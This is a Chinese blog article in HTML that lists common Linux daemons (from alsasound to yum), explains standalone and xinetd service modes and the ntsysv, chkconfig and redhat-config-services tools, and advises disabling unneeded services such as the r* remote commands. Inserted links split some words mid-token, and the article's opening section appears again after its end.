</p><p>&nbsp;&nbsp;&nbsp;&nbsp;47.mdmonitor：RAID相关设备的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;48.messagebus：D-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;BUS是一个库，为两个或两个以上的应用程序提供一对一的通讯。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;dbus-daemon-1是一个应用程序，它使用这个库来实现messagebus守护程序。多个应用程序通过连接messagebus守护程序可以实</p><p>&nbsp;&nbsp;&nbsp;&nbsp;现与其他程序交换信息。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;49.microcode_ctl：可编码以及发送新的微代码到内核以更新</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Intel</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp; IA32系列处理器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;50.mysqld： 一个快速高效可靠的轻型SQL数据库引擎守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;51.named：DNS（BIND）服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;52.netplugd：netplugd（network </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ca</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ble hotplug management daemon）守护程序，用于监控一个或多个网络接口的状态，当某些事件触发时运行一个外部脚本程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;53.netdump：远程网络备份服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;54.netfs：Network Filesystem Mounter，该进程安装和卸载NFS、SAMBA和NCP网络文件系统。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;55.nfs：网络文件系统守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;56.nfslock：NFS是一个流行的通过TCP/IP网络共享文件的协议，此守护进程提供了NFS文件锁定功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;57.ntpd：Network time Protocol daemon（网络时间校正协议）。ntpd是用来使系统和一个精确的时间源保持时间同步的协议守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;58.network：激活/关闭启动时的各个网络接口守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;59.psacct：该守护进程包括几个工具用来监控进程活动的工具，包括ac,lastcomm, accton 和sa。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;60.pcmcia：主要用于支持笔记本电脑接口守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;61.portmap：该守护进程用来支持RPC连接，RPC被用于NFS以及NIS 等服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;62.postgresql: PostgreSQL 关系数据库引擎。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;63.proftpd: proftpd 是Unix下的一个配置灵活的ftp服务器的守护程序。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;64.pppoe：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ADSL</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;连接守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;65.random ：保存和恢复系统的高质量随机数生成器，这些随机数是系 统一些随机行为提供的。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;66.rawdevices：在使用集群文件系统时用于加载raw设备的守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;67.readahead、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;readahead_early：readahead和readahead_early是在Fedora core</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2中最新推出的两个后台运行的守护程序。其作用是在启动系统期间，将启动系统所要用到的文件首先读取到内存中，然后在内存中进行执行，以加快系统的启动速</p><p>&nbsp;&nbsp;&nbsp;&nbsp;度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;68.rhnsd：Red Hat 网络服务守护进程。通知官方的安全信息以及为系统打补丁。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;69.routed ：该守护程序支持RIP协议的自动IP路由表维护。RIP主要 使用在小型网络上，大一点的网络就需要复杂一点的协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;70.rsync：remote sync远程数据备份守护进程。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;71.rsh ：远程主机上启动一个shell，并执行用户命令。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;72.rwhod： 允许远程用户获得运行rwho守护程序的机器上所有已登录用户的列表。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;73.rstatd：一个为LAN上的其它机器收集和提供系统信息的守候进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;74.ruserd：远程用户定位服务，这是一个基于RPC的服务，它提供关于当前记录到LAN上一个机器日志中的用户信息 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;75.rwalld：激活rpc.rwall服务进程，这是一项基于RPC的服务，允许用户给每个注册到LAN机器上的其他终端写消息 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;76.rwhod：激活rwhod服务进程，它支持LAN的rwho和ruptime服务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;77.saslauthd： 使用SASL的认证守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;78.sendmail：邮件服务器sendmail守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;79.smb：Samba文件共享/打印服务守护进程。</p><p>&nbsp;&nbsp\n;&nbsp;&nbsp;80.snmpd：本地简单网络管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;81.squid：代理服务器squid守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;82.sshd：OpenSSH服务器守护进程。Secure Shell Protocol可以实现安全地远程管理主机。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;83.smartd：Self Monitor Analysis and Reporting Technology System，监控你的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>硬盘</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;是否出现故障。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;84.syslog：一个让系统引导时起动syslog和klogd系统日志守候进程的脚本。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;85.time ：该守护进程从远程主机获取时间和日期，采用TCP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;86.time-udp： 该守护进程从远程主机获取时间和日期，采用UDP协议。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;87.tux：在Linux内核中运行apache服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;88.vsftpd：vsftpd服务器的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;89.vncserver： VNC （Virtual Network Computing，虚拟网络计算），它提供了一种在本地系统上显示远程计算机整个&quot;桌面&quot;的轻量型协议。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;90.xfs：X Window字型服务器守护进程，为本地和远程X服务器提供字型集。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;91.xinetd：支持多种网络服务的核心守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;92.ypbind：为NIS（网络信息系统）客户机激活ypbind服务进程 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;93.yppasswdd：NIS口令服务器守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;94.ypserv：NIS主服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;95.yum：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>RPM</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>自动升级和软件包管理守护进程。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 二、守护进程工作原理和方式</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 在Cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt/Server模式下。服务器监听（Listen）在一个特定的端口上等待客户连接。连接成功后服务器和客户端通过端口进行数据通信。守护进程的工作就是打开一个端口，并且等待（Listen）进入连接。如果客户端产生一个连接请求，守护进程就创建（Fork）一个子服务器响应这个连接，而主服务器继续监听其他的服务请求。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.守护进程工作方式：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1）运行独立的守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 独立运行的守护进程由init脚本负责管理，所有独立运行的守护进程的脚本在/etc/rc.d/init.d/目录下。系统服务都是独立运行的守护进程包括：syslogd和cron等。运行独立的守护进程工作方式称作：stand－alone。它</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;传</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统的C/S模式的访问模式。服务器监听（Listen）在一个特点的端口上等待客户端的联机。如果客户端产生一个连接请求，守护进程就创建（Fork）一</p><p>&nbsp;&nbsp;&nbsp;&nbsp;个子服务器响应这个连接，而主服务器继续监听。以保持多个子服务器池等待下一个客户端请求。stand－alone模式工作原理见图1。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/75ea2d2fbe422bbb8b139956.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;          图1 stand－alone工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工作在stand－alone模式下的网络服务有route、gated。另外是大家最熟悉是Web服务器：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Ap</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;ache和邮件服务器Sendmail、域名服务器Bind。因为这些负载很大服务器上，预先创子服务器，可以通过客户的服务速度。在</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;系统中通过stand－alone工作模式启动的服务由/etc/rc.d/下面对应的运行级别当中的符号链接启动。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（2）xinetd模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;从守护进程的概念可以看出，对于系统所要通过的每一种服务，都必须运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个监听某个端口连接所发生的守护进程，这通常意味着资源浪费。为了解决这个问题，Linux引进了“网络守护进程服务程序”的概念。Redhat</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux 9.0使用的网络守护进程是xinted（eXtended InterNET</p><p>&nbsp;&nbsp;&nbsp;&nbsp;daemon）。和stand－alone模式相比xinted模式也称 Internet</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Super－Server（超级服务器）。xinetd能够同时监听多个指定的端口，在接受用户请求时，他能够根据用户请求的端口不同，启动不同的网络服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务进程来处理这些用户请求。可以把xinetd看做一个管理启动服务的管理服务器，它决定把一个客户请求交给那个程序处理，然后启动相应的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd模式工作原理见图3。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/96e6d3ef3b8ee17063d09f56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;           图3  xinetd工作模式</p><p>&nbsp;&nbsp;&nbsp;&nbsp;和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;stand－alone工作模式相比，系统不想要每一个网络服务进程都监听其服务端口。运行单个xinetd就可以同时监听所有服务端口，这样就降低了系</p><p>&nbsp;&nbsp;&nbsp;&nbsp;统开销，保护系统资源。但是对于访问量大、经常出现并发访问时，xinetd想要频繁启动对应的网络服务进程，反而会导致系统性能下降。察看系统为</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux服务提供那种模式方法在Linux命令行可以使用pstree命令可以看到两种不同方式启动的网络服务。一般来说系统一些负载高的服</p><p>&nbsp;&nbsp;&nbsp;&nbsp;务：sendmail、Apache服务是单独启动的。而其他服务类型都可以使用xinetd超级服务器管理。查看目前运行的守护进程可以使用命</p><p>&nbsp;&nbsp;&nbsp;&nbsp;令：“pstree”</p><p>&nbsp;&nbsp;&nbsp;&nbsp;三、守护进程管理工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp;Linux提供了三种不同的守护进程管理工具：redhat－config－services、ntsysv、chkconfig，可以根据具体需要灵活运用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;（1） redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat－config－services</p><p>&nbsp;&nbsp;&nbsp;&nbsp;是一个一个图形化应用程序，它显示了每项服务的描述，以及每项服务是否在引导时启动（运行级别3、4、5），并允许你启动、停止、或重新启动/etc</p><p>&nbsp;&nbsp;&nbsp;&nbsp;/rc.d/init.d 中的哪些 SysV 服务，哪些 xinetd 服务。要从桌面启动服务配置工具，点击面板上的「主菜单」 =&gt;</p><p>&nbsp;&nbsp;&nbsp;&nbsp;「系统设置」 =&gt; 「服务器设置」 =&gt; 「服务」，或在 shell</p><p>&nbsp;&nbsp;&nbsp;&nbsp;提示下，键入命令：“redhat-config-services” （见图4）。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<i\nmg src=\"/images/pic/0d2a1924d14d7554908f9d56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp;  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    图4 redhat-config-services配置工具</p><p>&nbsp;&nbsp;&nbsp;&nbsp; redhat-</p><p>&nbsp;&nbsp;&nbsp;&nbsp;config-services列出了 /etc/rc.d/init.d 中的服务和由 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;控制的服务。点击左侧列表中的服务名来显示该服务的简短描述以及它的服务状态。如果这个服务不是 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务，状态窗口会显示该服务目前是否在运行。如果该服务被 xinetd 所控制，状态窗口会显示「xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务」这个短语。要立即启动、停止、或重新启动某项服务，从列表中选择该项服务，然后点击工具栏上的相应按钮（或从「行动」拉下菜单中选择行动）。如果该</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务是一个 xinetd 服务，行动按钮会被禁用，因为它们不能被单个地启动或停止。 如果你通过选择或取消选择服务名旁的复选箱来启用或禁用了</p><p>&nbsp;&nbsp;&nbsp;&nbsp;xinetd 服务，你必须从拉下菜单中选择「文件」 =&gt; 「保存改变」来重新启动 xinetd，并立即启用或禁用你所改变的 xinetd</p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务。xinetd 还被配置成自动记忆设置。你可以同时启用或禁用多个 xinetd 服务，在结束后再保存改变。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; （2）ntsysv </p><p>&nbsp;&nbsp;&nbsp;&nbsp; ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;工具为激活或停运服务提供了简单的界面。你可以使用 ntsysv 来启动或关闭由 xinetd 管理的服务。你还可以使用 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来配置运行级别。按照默认设置，只有当前运行级别会被配置。要配置不同的运行级别，使用 --level 选项来指定一个或多个运行级别。譬如，命令</p><p>&nbsp;&nbsp;&nbsp;&nbsp;ntsysv --level 345 配置运行级别3、4、和5。 ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的工作界面见图1。使用上下箭头来上下查看列表。使用空格键来选择或取消选择服务，或用来“按”「确定」和「取消」按钮。要在服务列表和「确定」、「取</p><p>&nbsp;&nbsp;&nbsp;&nbsp;消」按钮中切换，使用 [Tab]键。* 标明某服务被设为启动。[F1] 键会弹出每项服务的简短描述。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;(3)chkconfig </p><p>&nbsp;&nbsp;&nbsp;&nbsp; chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令也可以用来激活和解除服务。chkconfig --list</p><p>&nbsp;&nbsp;&nbsp;&nbsp;命令显示系统服务列表，以及这些服务在运行级别0到6中已被启动（on）还是停止（off）。chkconfig</p><p>&nbsp;&nbsp;&nbsp;&nbsp;还能用来设置某一服务在某一指定的运行级别内被启动还是被停运。譬如，要在运行级别3、4、5中停运 nfs 服务，使用下面的命令： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;chkconfig --level 345 nfs off</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 再结合一下脚本，需求不一样，自行修改。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; http://hi.baidu.com/key1088/blog/item/1e1cc63231a703b95fdf0e71.html</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 四、合理选择守护进程规避安全隐患</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 运行不必要或有漏洞的守护进程会给<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>操作系统</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong>带</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来安全和性能上的影响。对于系统安全来说，如果操作系统中的任何一个漏洞，都可能使整个系统受到攻击。所以，增加系统安全的最佳办法就是尽量监视系统的功</p><p>&nbsp;&nbsp;&nbsp;&nbsp;能。文章开始介绍了重要的守护进程，其中“crond、syslog、keytable、xinetd、kudzu、iptables”等是需要运行</p><p>&nbsp;&nbsp;&nbsp;&nbsp;的，echo、echo-udp、daytime、daytime-udp、chargen、chargen-udp主要是做调试用，普通用户基本用不</p><p>&nbsp;&nbsp;&nbsp;&nbsp;到，可以关闭。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; r字开头的守护进程：rsh、rstatd、rsync、ruser</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>sd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;rwalld这些命令都是Berkley远程命令，因为都以字母r开头，故称r*命令。主要使用来使一台计算机上的某个用户以相同的帐户远程执行另一台计</p><p>&nbsp;&nbsp;&nbsp;&nbsp;算机的一个程序。但是，r命令已经被证实存在安全风险。对于确实需要的守护进程，应该尽量选用最新的版本程序，并增加其安全防范。  </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 另外我们还要合理选择守护进程例如innd是运行新闻组服务的进程，如果用户不做Usenet服务器，应该关掉。</p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;总结：</p><p>&nbsp;&nbsp;&nbsp;&nbsp; 基于开放源代码的Linux给用户提供了这样一个平台：可以根据自己的软、硬件环境，定制自己的Linux守护进程。因此，根据每个用户不同的应用范围定制应用环境，可以将Linux系统的安全和性能提升到新的高度。 </p><p>&nbsp;</p><p>&nbsp;</p>","site":{"data":{}},"excerpt":"","more":"<p>&nbsp; <a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Linux</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;服务器在启动时需要启动很多系统服务，它们向本地和网络用户提供了Linux的系统功能接口，直接面向应用程序和用户。提供这些服务的程序是由运行在后台的守护进程（daemons）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;来执行的。守护进程是生存期长的一种进程。它们独立于控制终端并且周期性的执行某种任务或等待处理某些发生的事件。他们常常在系统引导装入时启动，在系统</p><p>&nbsp;&nbsp;&nbsp;&nbsp;关闭时终止。linux系统有很多守护进程，大多数服务器都是用守护进程实现的。同时，守护进程完成许多系统任务，比如，作业规划进程crond、打印进</p><p>&nbsp;&nbsp;&nbsp;&nbsp;程lqd等。有些书籍和资料也把守护进程称作：“服务”。选择运行哪些守护进程，要根据具体需求决定。查看系统可以提供的守护进程对应的服务，使用下面方</p><p>&nbsp;&nbsp;&nbsp;&nbsp;法，以root权限运行： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;#ntsysv</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<img src=\"/images/pic/8de818da5f4ed57b10df9b56.jpg\" /></p><p>&nbsp;&nbsp;&nbsp;&nbsp; </p><p>&nbsp;&nbsp;&nbsp;&nbsp;   图1 可以选择的系统服务 </p><p>&nbsp;&nbsp;&nbsp;&nbsp; 界面如图1所示的窗口，下面详细介绍一下各项系统服务的功能。以英文字母为序： </p><p>&nbsp;&nbsp;&nbsp;&nbsp;    一、Linux守护进程简介</p><p>&nbsp;&nbsp;&nbsp;&nbsp;1.alsasound</p><p>&nbsp;&nbsp;&nbsp;&nbsp;：Alsa声卡驱动守护程序。Alsa声卡驱动程序本来是为了 一种声卡Gravis UltraSound(GUS)而写的，该程序被证</p><p>&nbsp;&nbsp;&nbsp;&nbsp;明很优秀，于是作者就开始为一般的声卡写 驱动程序。 Alsa和OSS/Free 及OSS/Linux兼容，但是有自己的接</p><p>&nbsp;&nbsp;&nbsp;&nbsp;口，甚至比OSS优秀。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;2.acpid：acpid（Advanced Configuration and Power Interface）是为替代传统的</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://wiki.ccw.com.cn/APhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>AP</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;M电源管理标准而推出的新型电源管理标准。通常笔记本电脑需要启动电源进行管理。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;3.atalk：AppleTalk网络守护进程。注意不要在后台运行该程序，该程序的数据结构必须在运行其他进程前先花一定时间初始化。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;4.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://topic.ccw.com.cn/corpCenter/592.htmlhttp://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>amd</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;： 自动安装NFS守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;5.anacron：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;一个自动化运行任务守护进程。Red Hat Linux 随带四个自动化任务的工具：cron、 anacron、at、和</p><p>&nbsp;&nbsp;&nbsp;&nbsp;batc。当你的Linux服务器并不是全天运行，这个anacron就可以帮你执行在&quot;crontab&quot;设定的时间内没有执行的工作。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;6.apmd：apmd（Advanced Power Management）是高级电源管理。传统的电源管理标准，对于笔记本电脑比较有用，可以了解系统的电池电量信息。并将相关信息通过syslogd 写入日志。也可以用来在电源不足时关机。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;7.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>arp</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tables_jf ：为arptables网络的用户控制过滤的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;8.arpwatch： 记录日志并构建一个在LAN接口上看到的以太网地址和IP地址对<strong></strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"></a></strong><strong>数据库</strong></p><p><strong>&nbsp;&nbsp;&nbsp;&nbsp;</strong> 。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;atd：at和batch命令守护进程，用户用at命令调度的任务。Batch用于在系统负荷比较低时  运行批处理任务。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;9.autofs：自动安装管理进程automount，与NFS相关，依赖于NIS服务器。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;10.bootparamd：引导参数服务器，为LAN上的无盘工作站提供引导所需的相关信息。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;11.bluetooch：蓝牙服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;12.crond ：cron是</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Unix</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;下的一个传统程序，该程序周期地运行用户 调度的任务。比起传统的Unix版本，Linux版本添加了不少属性，而且更安全，配置更简单。类似计划任务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;13.chargen：使用tcp协议的chargen server，chargen（Character Generator  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>Pro</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;tocol）是一种网络服务，主要功能是提供类似远程打字的功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;14.chargen-udp：使用UDP协议的chargen server。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;15.cpuspeed：监测系统空闲百分比，降低或加快CPU时钟速度和电压从而在系统空闲时将能源消耗降为最小，而在系统繁忙时最大化加快系统执行速度。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;16.dhcpd：动态主机控制协议(Dynamic Host Control Protocol)的服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;17.cups： cups(Common UNIX Printing System)是通用UNIX打印守护进程，为Linux提供第三代打印功能。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;18.cups－config－daemons：cups打印系统切换守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;19.cups-lpd：cups行打印守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;20.daytime：使用TCP 协议的Daytime守护进程，该协议为客户机实现从远程服务器获取日期 和时间的功能。预设端口：13。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;21.daytime-udp：使用UDP 协议的Daytime守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;22.dc_server：使用SSL安全套接字的代理服务器守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;23.dc_cl</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" target=\"_blank\" rel=\"noopener noreferrer\"><strong>ie</strong></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;nt：使用SSL安全套接字的客户端守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;24.diskdump：服务器磁盘备份守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;25.echo：服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;26.echo-udp：使用UDP协议的服务器回显客户数据服务守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;27.eklogin：接受rlogin会话鉴证和用kerberos5加密的一种服务的守护进程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;28.gated ：网关路由守护进程。它支持各种路由协议，包括RIP版本1和2、DCN HELLO协议、 OSPF版本2以及EGP版本2到4。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;29.gpm：gpm（General Purpose Mouse Daemon ）守护进程为文本模式下的Linux程序如mc(Midnight Commander)提供了鼠标的支持。它也支持控制台下鼠标 的拷贝，粘贴操作以及弹出式菜单。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;30.gssftp： 使用kerberos 5认证的ftp守护进程</p><p>&nbsp;&nbsp;&nbsp;&nbsp;31.httpd：Web服务器Apache守护进程，可用来提供HTML文件以 及CGI动态内容服务。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;32.inetd ：因特网操作守护程序。监控网络对各种它管理的服务的需求，并在必要的时候启动相应的服务程序。在Redhat 和Mandrake linux中被\nxinetd代替。Debian, Slackware, </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://hi.baidu.com/key1088/creat/blog/linux%26%2338%3Bunix\" 